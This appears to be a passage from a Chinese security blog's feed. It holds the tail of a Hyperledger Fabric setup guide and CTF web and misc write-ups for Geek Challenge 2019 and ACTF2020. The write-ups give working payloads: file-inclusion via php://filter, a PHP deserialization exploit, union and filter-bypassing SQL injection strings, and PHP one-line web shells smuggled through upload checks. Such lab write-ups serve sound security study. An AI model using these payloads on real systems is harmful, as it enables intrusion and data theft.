<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;network.sh deployCC</span><br></pre></td></tr></table></figure></div>

<p>在此期间可能会遇到 go get 无法下载（安装go的依赖包的时候,长时间无响应.</p>
<p>解决办法: 使用七牛云 go module 镜像</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go env -w GO111MODULE=on</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure></div>

<p>得到下图，启动成功</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/5.png" src="/img/loading.gif" class="lazyload"></a>

<p>3、与网络互动</p>
<p>网络启动之后，可以使用peer cli客户端去操作网络，可以通过cli客户端去调用部署智能合约，更新通道，或者安装和部署新的智能合约。</p>
<p>本文参考：<a href="https://blog.csdn.net/tianshuhao521/article/details/104695687" target="_blank" rel="noopener">tianshuhao521</a>、<a href="https://blog.csdn.net/qq_42680655/article/details/105188538" target="_blank" rel="noopener">Yesterjunior</a></p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
        <tag>HyperLedger_Fabric</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战_2019</title>
    <url>/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/</url>
    <content><![CDATA[<p>人傻了，开这篇博客之前以为这就是场恶战。。没想到呀。。。好吧还行。。好多SQL。。。而且咋都变成1分了。。</p>
<h3 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h3><p>万能密码，登录得到flag</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/1.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h3><p>F12发现下面代码，get传参cat=dog即可</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$cat=$_GET[<span class="string">'cat'</span>];</span><br><span class="line">        <span class="keyword">echo</span> $cat;</span><br><span class="line">        <span class="keyword">if</span>($cat==<span class="string">'dog'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h3><p>302重定向、filter伪协议</p>
<p>拿到题跟着源代码走，发现有个302，bp抓一下包</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>访问secr3t.php，得到以下源码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>过滤了：../、tp、input、data。并提示flag在flag.php里</p>
<p>构造：<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p>得到base64加密后的源码，解码后得到flag</p>
<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p><a href="http://www.zip、反序列化" target="_blank" rel="noopener">www.zip、反序列化</a></p>
<p>提示备份网站想到bak，但是没想到<a href="http://www.zip，扫一下才发现。。" target="_blank" rel="noopener">www.zip，扫一下才发现。。</a></p>
<p>解压得到三个文件index.php、class.php、flag.php，前两个有、用，flag.php就迷惑一哈，得到以下代码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">    $select = $_GET[<span class="string">'select'</span>];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>反序列化，构造如下</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="keyword">new</span> Name(<span class="string">"admin"</span>,<span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="comment">//得到</span></span><br><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Name%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>admin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A100%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line"><span class="comment">//但是还要绕过__wakeup()所以要把序列化后的类中的变量数变大点</span></span><br></pre></td></tr></table></figure></div>

<p>最后构造</p>
<p>select=O%3A4%3A”Name”%3A<strong><em>3</em></strong>%3A%7Bs%3A14%3A”%00Name%00username”%3Bs%3A5%3A”admin”%3Bs%3A14%3A”%00Name%00password”%3Bi%3A100%3B%7D，得到flag</p>
<h3 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h3><p>一句话已经给出来了，拿菜刀连一下或者直接传参进行命令执行就好啦。在根目录下发现flag</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>然后再<code>cat /flag</code>就得到flag了</p>
<h3 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h3><p>简单注入，先用万能密码登录一下，然后用order语句查表发现有三列</p>
<p>没有过滤，sqlmap就不要搞了，手工联合注一下</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;union select 1,2,group_concat(schema_name) from information_schema.schemata#</span><br><span class="line">1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;geek&#39;#</span><br><span class="line">1&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;#</span><br><span class="line">1&#39;union select 1,2,group_concat(concat_ws(&#39;~&#39;,username,password)) from geek.l0ve1ysq1#</span><br></pre></td></tr></table></figure></div>

<h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p>查看源码发现<code>Secret.php</code></p>
<p>访问后提示：It doesn’t come from ‘<a href="https://www.Sycsecret.com&#39;，加一下Referer:https://www.Sycsecret.com" target="_blank" rel="noopener">https://www.Sycsecret.com&#39;，加一下Referer:https://www.Sycsecret.com</a></p>
<p>再次访问后提示：Please use “Syclover” browser，改一下UA:Syclover</p>
<p>最后访问后提示：No!!! you can only read this locally!!!，加一个XFF:127.0.0.1</p>
<p>最后访问得到flag</p>
<h3 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h3><p>首先尝试万能密码，发现or被过滤掉，双写绕过</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/4.png" src="/img/loading.gif" class="lazyload"></a>

<p>登录成功，尝试联合注入，发现union、select、where、from被过滤</p>
<p>注入代码如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; uniounionn selecselectt 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata--+</span><br><span class="line">1&#39; uniounionn selecselectt 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;&#39;geek&#39;--+</span><br><span class="line">1&#39; uniounionn selecselectt 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;b4bsql&#39;--+</span><br><span class="line">1&#39; uniounionn selecselectt 1,2,group_concat(concat_ws(&#39;~&#39;,username,passwoorrd)) frofromm geek.b4bsql--+</span><br></pre></td></tr></table></figure></div>

<h3 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h3><p>打开后在menu出找到buyflag，跳转后查看源代码发现</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">	$password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">	if (is_numeric($password)) &#123;</span><br><span class="line">		echo &quot;password can&#39;t be number&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	&#125;elseif ($password &#x3D;&#x3D; 404) &#123;</span><br><span class="line">		echo &quot;Password Right!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div>

<p>并且有提示<code>Only Cuit&#39;s students can buy the FLAG</code>，猜不到构造什么http头，所以抓包看看</p>
<p>发现http头中Cookie中有user=0，将其改为user=1</p>
<p>令password=404a，即可绕过数字判断，下面强制比较时会强制转化，所以成功绕过</p>
<p>直接post，money提示<code>Nember lenth is too long</code>，利用strcmp比较数组和字符时会返回零的特点进行绕过，得到flag</p>
<h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>后缀检测、文件头检测、Content-Type检测、上传文件大小检测、&lt;? 检测</p>
<p>蚁剑连上去得到下面源码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_FILES[<span class="string">"file"</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 允许上传的图片后缀</span></span><br><span class="line">$allowedExts = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php2"</span>,<span class="string">"php3"</span>,<span class="string">"php4"</span>,<span class="string">"php5"</span>,<span class="string">"pht"</span>,<span class="string">"phtm"</span>);</span><br><span class="line">$temp = explode(<span class="string">"."</span>, $file[<span class="string">"name"</span>]);</span><br><span class="line">$extension = strtolower(end($temp));        <span class="comment">// 获取文件后缀名</span></span><br><span class="line">$image_type = @exif_imagetype($file[<span class="string">"tmp_name"</span>]);</span><br><span class="line"><span class="keyword">if</span> ((($file[<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">|| ($file[<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">|| ($file[<span class="string">"type"</span>] == <span class="string">"image/jpg"</span>)</span><br><span class="line">|| ($file[<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">|| ($file[<span class="string">"type"</span>] == <span class="string">"image/x-png"</span>)</span><br><span class="line">|| ($file[<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">&amp;&amp;$file[<span class="string">"size"</span>] &lt; <span class="number">20480</span>)    <span class="comment">// 小于 20 kb</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($file[<span class="string">"error"</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ERROR!!!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (in_array($extension, $allowedExts)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"NOT！"</span>.$extension.<span class="string">"!"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">elseif</span> (mb_strpos(file_get_contents($file[<span class="string">"tmp_name"</span>]), <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"NO! HACKER! your file included '&amp;#x3C;&amp;#x3F;'"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (!$image_type) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Don't lie to me, it's not image at all!!!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $fileName=<span class="string">'./upload/'</span>.$file[<span class="string">'name'</span>];</span><br><span class="line">        move_uploaded_file($file[<span class="string">'tmp_name'</span>],$fileName); </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"上传文件名: "</span> . $file[<span class="string">"name"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Not image!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>绕过姿势：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;1.phtml&quot;</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line"></span><br><span class="line">GIF89a? &lt;script language&#x3D;&quot;Php&quot;&gt;eval($_REQUEST[pass])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="HardSQL"><a href="#HardSQL" class="headerlink" title="HardSQL"></a>HardSQL</h3><h3 id="FinalSQL"><a href="#FinalSQL" class="headerlink" title="FinalSQL"></a>FinalSQL</h3><h3 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE ME"></a>RCE ME</h3>]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>ACTF2020新生赛</title>
    <url>/2020/04/13/ACTF2020/</url>
    <content><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h3><p>这个题主要考用php://filter伪协议进行文件包含</p>
<p>进入题目发现url中有?file=flag.php，首先想到用php://伪协议来发送php代码，然后发现提示：<code>hacker!</code></p>
<p>然后就想到用php://filter来读取flag.php文件base64源码</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/13/ACTF2020/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>base64解码后得到flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Can you find out the flag?"</span>;</span><br><span class="line"><span class="comment">//flag&#123;1d7f32d1-354d-4f5a-b1dd-cd41e002f741&#125;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h3><p>基础的命令执行</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/13/ACTF2020/2.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="BackupFile"><a href="#BackupFile" class="headerlink" title="BackupFile"></a>BackupFile</h3><p>备份文件、ezbypass</p>
<p>题目名字提示已经bak文件了，我还是扫了一下。</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/13/ACTF2020/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>得到源码：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>要满足是数字且的<code>$key == $str</code>因为php中string转int时会只保留数字，令<code>key=123</code>即可</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/13/ACTF2020/4.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>JS前端验证、ph扩展名绕过</p>
<p>本来以为要绕过前端验证，传.htaccess的发现它会自动加个前缀，无法实现解析功能，然后试着传了ph类的东西，发现phtml可以传上去</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/04/13/ACTF2020/5.png" src="/img/loading.gif" class="lazyload"></a>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;1.phtml&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_REQUEST[&#39;pass&#39;]);?&gt;</span><br></pre></td></tr></table></figure></div>

<p>蚁剑连一下，得到flag</p>
<p>index.php的源码，看到过滤了php、php345，还有加了个md5的前缀</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="comment">//设置上传目录</span></span><br><span class="line">	define(<span class="string">"UPLOAD_PATH"</span>, <span class="string">"./uplo4d"</span>);</span><br><span class="line">	$msg = <span class="string">"Upload Success!"</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line">        <span class="keyword">if</span>(in_array($ext, [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>])) &#123;</span><br><span class="line">	        <span class="keyword">exit</span>(<span class="string">'nonono~ Bad file！'</span>);</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">        $new_file_name = md5($file_name).<span class="string">"."</span>.$ext;</span><br><span class="line">        $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $new_file_name;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'Upload Failed!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;div style="color:#F00"&gt;'</span>.$msg.<span class="string">" Look here~ "</span>.$img_path.<span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>可以看到.htaccess文件的内容就是解析phtml为可执行php文件</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch \.phtml$&gt;</span><br><span class="line">	SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="base64隐写"><a href="#base64隐写" class="headerlink" title="base64隐写"></a>base64隐写</h3><p>题目=解题方法</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">bin_str=<span class="string">''</span></span><br><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'stego.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">	<span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">		stegb64=<span class="string">""</span>.join(line.split())</span><br><span class="line">		rowb64=<span class="string">""</span>.join(str(base64.b64encode(base64.b64decode(stegb64)),<span class="string">'utf-8'</span>).split())</span><br><span class="line">		offset=abs(b64chars.index(stegb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[<span class="number">-1</span>])-b64chars.index(rowb64.replace(<span class="string">'='</span>, <span class="string">''</span>)[<span class="number">-1</span>]))</span><br><span class="line">		equalnum=line.count(<span class="string">'='</span>)</span><br><span class="line">		<span class="keyword">if</span> equalnum:</span><br><span class="line">			bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">	print(<span class="string">''</span>.join([chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(bin_str),<span class="number">8</span>)]))</span><br></pre></td></tr></table></figure></div>

<p>运行脚本得到flag：<code>ACTF{6aseb4_f33!}</code></p>
<h3 id="NTFS数据流"><a href="#NTFS数据流" class="headerlink" title="NTFS数据流"></a>NTFS数据流</h3><p>下载解压后发现500个txt，第293三个明显不同</p>
<p>拿<code>NtfsStreamsEditor2.exe</code>导出一下得到flag：<code>ACTF{AAAds_nntfs_ffunn?}</code> </p>
<h3 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h3><p>Outguess、图片属性、社会主义核心价值编码</p>
<p>图片属性里有社会主义核心价值编码，解码后得到key：abc</p>
<p>Outguess解一下图片即可得到flag</p>
